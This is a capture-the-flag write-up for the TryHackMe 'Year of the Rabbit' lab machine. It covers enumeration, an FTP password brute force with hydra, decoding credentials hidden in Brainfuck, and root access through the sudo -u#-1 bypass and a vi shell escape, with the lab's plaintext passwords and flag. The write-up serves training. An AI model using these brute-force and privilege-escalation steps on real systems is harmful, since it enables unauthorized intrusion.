@@ -1,0 +1,295 @@
+YearoftheRabbit is an intermediate boot2root machine. (Tryhackme)
+IP:10.10.46.181
+Nmap scan results:
+
+Host is up (0.14s latency).
+Not shown: 997 closed ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.2
+22/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 a0:8b:6b:78:09:39:03:32:ea:52:4c:20:3e:82:ad:60 (DSA)
+|   2048 df:25:d0:47:1f:37:d9:18:81:87:38:76:30:92:65:1f (RSA)
+|   256 be:9f:4f:01:4a:44:c8:ad:f5:03:cb:00:ac:8f:49:44 (ECDSA)
+|_  256 db:b1:c1:b9:cd:8c:9d:60:4f:f1:98:e2:99:fe:08:03 (ED25519)
+80/tcp open  http    Apache httpd 2.4.10 ((Debian))
+|_http-server-header: Apache/2.4.10 (Debian)
+|_http-title: Apache2 Debian Default Page: It works
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.80%E=4%D=10/8%OT=21%CT=1%CU=42222%PV=Y%DS=2%DC=T%G=Y%TM=5F7EB71
+OS:C%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10A%TI=Z%CI=I%II=I%TS=8)OPS
+OS:(O1=M505ST11NW6%O2=M505ST11NW6%O3=M505NNT11NW6%O4=M505ST11NW6%O5=M505ST1
+OS:1NW6%O6=M505ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN
+OS:(R=Y%DF=Y%T=40%W=6903%O=M505NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
+OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
+OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
+OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
+OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
+OS:=S)
+
+
+As of now we got ftp and http to enumerate.
+Lets fire up nikto and dirb for http.
+
+I cant login anonymously to the ftp server and it got no exploits related to version 3.0.2
+
+Got a directory named /assets and found one mp4 file and style.css
+
+But I think the mp4 file is a rabbit hole and found this text in style.css
+
+/* Nice to see someone checking the stylesheets.
+     Take a look at the page: /sup3r_s3cr3t_fl4g.php
+  */
+
+https://www.youtube.com/watch?v=dQw4w9WgXcQ?autoplay=1
+
+Got this response after requesting for the following page http://10.10.145.247//sup3r_s3cr3t_fl4g.php
+
+HTTP/1.1 302 Found
+Date: Thu, 08 Oct 2020 08:10:06 GMT
+Server: Apache/2.4.10 (Debian)
+Location: intermediary.php?hidden_directory=/WExYY2Cv-qU
+Content-Length: 0
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+This hidden directory can be a way to get access to the machine.
+
+/WExYY2Cv-qU
+
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/Yearoftherabbit# wget http://10.10.145.247/WExYY2Cv-qU/Hot_Babe.png
+--2020-10-08 13:43:06--  http://10.10.145.247/WExYY2Cv-qU/Hot_Babe.png
+Connecting to 10.10.145.247:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 475075 (464K) [image/png]
+Saving to: 'Hot_Babe.png'
+
+Hot_Babe.png                                        100%[===================================================================================================================>] 463.94K   440KB/s    in 1.1s    
+
+2020-10-08 13:43:07 (440 KB/s) - 'Hot_Babe.png' saved [475075/475075]
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/Yearoftherabbit# 
+
+
+Eh, you've earned this. Username for FTP is ftpuser
+One of these is the password:
+Mou+56n%QK8sr
+1618B0AUshw1M
+A56IpIl%1s02u
+vTFbDzX9&Nmu?
+FfF~sfu^UQZmT
+8FF?iKO27b~V0
+ua4W~2-@y7dE$
+3j39aMQQ7xFXT
+Wb4--CTc4ww*-
+u6oY9?nHv84D&
+0iBp4W69Gr_Yf
+TS*%miyPsGV54
+C77O3FIy0c0sd
+O14xEhgg0Hxz1
+5dpv#Pr$wqH7F
+1G8Ucoce1+gS5
+0plnI%f0~Jw71
+0kLoLzfhqq8u&
+kS9pn5yiFGj6d
+zeff4#!b5Ib_n
+rNT4E4SHDGBkl
+KKH5zy23+S0@B
+3r6PHtM4NzJjE
+gm0!!EC1A0I2?
+HPHr!j00RaDEi
+7N+J9BYSp4uaY
+PYKt-ebvtmWoC
+3TN%cD_E6zm*s
+eo?@c!ly3&=0Z
+nR8&FXz$ZPelN
+eE4Mu53UkKHx#
+86?004F9!o49d
+SNGY0JjA5@0EE
+trm64++JZ7R6E
+3zJuGL~8KmiK^
+CR-ItthsH%9du
+yP9kft386bB8G
+A-*eE3L@!4W5o
+GoM^$82l&GA5D
+1t$4$g$I+V_BH
+0XxpTd90Vt8OL
+j0CN?Z#8Bp69_
+G#h~9@5E5QA5l
+DRWNM7auXF7@j
+Fw!if_=kk7Oqz
+92d5r$uyw!vaE
+c-AA7a2u!W2*?
+zy8z3kBi#2e36
+J5%2Hn+7I6QLt
+gL$2fmgnq8vI*
+Etb?i?Kj4R=QM
+7CabD7kwY7=ri
+4uaIRX~-cY6K4
+kY1oxscv4EB2d
+k32?3^x1ex7#o
+ep4IPQ_=ku@V8
+tQxFJ909rd1y2
+5L6kpPR5E2Msn
+65NX66Wv~oFP2
+LRAQ@zcBphn!1
+V4bt3*58Z32Xe
+ki^t!+uqB?DyI
+5iez1wGXKfPKQ
+nJ90XzX&AnF5v
+7EiMd5!r%=18c
+wYyx6Eq-T^9#@
+yT2o$2exo~UdW
+ZuI-8!JyI6iRS
+PTKM6RsLWZ1&^
+3O$oC~%XUlRO@
+KW3fjzWpUGHSW
+nTzl5f=9eS&*W
+WS9x0ZF=x1%8z
+Sr4*E4NT5fOhS
+hLR3xQV*gHYuC
+4P3QgF5kflszS
+NIZ2D%d58*v@R
+0rJ7p%6Axm05K
+94rU30Zx45z5c
+Vi^Qf+u%0*q_S
+1Fvdp&bNl3#&l
+zLH%Ot0Bw&c%9
+
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/Yearoftherabbit# hydra -l ftpuser -P password.txt ftp://10.10.145.247
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-10-08 13:46:10
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 82 login tries (l:1/p:82), ~6 tries per task
+[DATA] attacking ftp://10.10.145.247:21/
+[21][ftp] host: 10.10.145.247   login: ftpuser   password: 5iez1wGXKfPKQ
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-10-08 13:46:26
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/Yearoftherabbit# 
+
+
+Noice
+
+After loggin in using the ftp user and password I got this brainfuck credentials for eli.
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/Yearoftherabbit# cat Eli\'s_Creds.txt 
++++++ ++++[ ->+++ +++++ +<]>+ +++.< +++++ [->++ +++<] >++++ +.<++ +[->-
+--<]> ----- .<+++ [->++ +<]>+ +++.< +++++ ++[-> ----- --<]> ----- --.<+
+++++[ ->--- --<]> -.<++ +++++ +[->+ +++++ ++<]> +++++ .++++ +++.- --.<+
++++++ +++[- >---- ----- <]>-- ----- ----. ---.< +++++ +++[- >++++ ++++<
+]>+++ +++.< ++++[ ->+++ +<]>+ .<+++ +[->+ +++<] >++.. ++++. ----- ---.+
+++.<+ ++[-> ---<] >---- -.<++ ++++[ ->--- ---<] >---- --.<+ ++++[ ->---
+--<]> -.<++ ++++[ ->+++ +++<] >.<++ +[->+ ++<]> +++++ +.<++ +++[- >++++
++<]>+ +++.< +++++ +[->- ----- <]>-- ----- -.<++ ++++[ ->+++ +++<] >+.<+
+++++[ ->--- --<]> ---.< +++++ [->-- ---<] >---. <++++ ++++[ ->+++ +++++
+<]>++ ++++. <++++ +++[- >---- ---<] >---- -.+++ +.<++ +++++ [->++ +++++
+<]>+. <+++[ ->--- <]>-- ---.- ----. <
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/Yearoftherabbit# 
+
+User: eli
+
+Password: DSpDiM1wAEwid
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/Yearoftherabbit# ssh eli@10.10.145.247
+The authenticity of host '10.10.145.247 (10.10.145.247)' can't be established.
+ECDSA key fingerprint is SHA256:ISBm3muLdVA/w4A1cm7QOQQOCSMRlPdDp/x8CNpbJc8.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.145.247' (ECDSA) to the list of known hosts.
+eli@10.10.145.247's password: 
+
+
+1 new message
+Message from Root to Gwendoline:
+
+"Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"
+
+END MESSAGE
+
+
+
+
+eli@year-of-the-rabbit:~$ id
+uid=1000(eli) gid=1000(eli) groups=1000(eli),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner),119(bluetooth)
+eli@year-of-the-rabbit:~$ 
+
+
+
+eli@year-of-the-rabbit:~$ find /  -name "s3cr3t" 2>/dev/null
+/usr/games/s3cr3t
+eli@year-of-the-rabbit:~$ 
+
+
+
+eli@year-of-the-rabbit:/usr/games$ cd s3cr3t/
+eli@year-of-the-rabbit:/usr/games/s3cr3t$ ls
+eli@year-of-the-rabbit:/usr/games/s3cr3t$ ls -la
+total 12
+drwxr-xr-x 2 root root 4096 Jan 23  2020 .
+drwxr-xr-x 3 root root 4096 Jan 23  2020 ..
+-rw-r--r-- 1 root root  138 Jan 23  2020 .th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
+eli@year-of-the-rabbit:/usr/games/s3cr3t$ cat .th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly\! 
+Your password is awful, Gwendoline. 
+It should be at least 60 characters long! Not just MniVCQVhQHUNI
+Honestly!
+
+Yours sincerely
+   -Root
+eli@year-of-the-rabbit:/usr/games/s3cr3t$ 
+
+gwendoline@year-of-the-rabbit:/usr/games/s3cr3t$ id
+uid=1001(gwendoline) gid=1001(gwendoline) groups=1001(gwendoline)
+gwendoline@year-of-the-rabbit:/usr/games/s3cr3t$ 
+
+
+As we are gwendoline we can see if we have any sudo privileges.
+
+gwendoline@year-of-the-rabbit:~$ sudo -V
+Sudo version 1.8.10p3
+Sudoers policy plugin version 1.8.10p3
+Sudoers file grammar version 43
+Sudoers I/O plugin version 1.8.10p3
+gwendoline@year-of-the-rabbit:~$ sudo -l
+Matching Defaults entries for gwendoline on year-of-the-rabbit:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User gwendoline may run the following commands on year-of-the-rabbit:
+    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
+gwendoline@year-of-the-rabbit:~$ 
+
+So this means that we can run all other privileges except.
+I was able to find exploit for this one.
+
+Check this out: https://www.exploit-db.com/exploits/47502
+
+sudo -u#-1 /bin/bash
+
+here we can use
+
+sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
+
+
+:!/bin/sh
+
+
+Type this and you will get root access.
+
+PoC:
+
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# exit
+
+Press ENTER or type command to continue
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# cd /root
+# ls
+root.txt
+# 
+
+THM{$#$$$$##$0de27a4fd61aef0f3a0ecf9161}
+
+Thank you...Happy Hacking :)
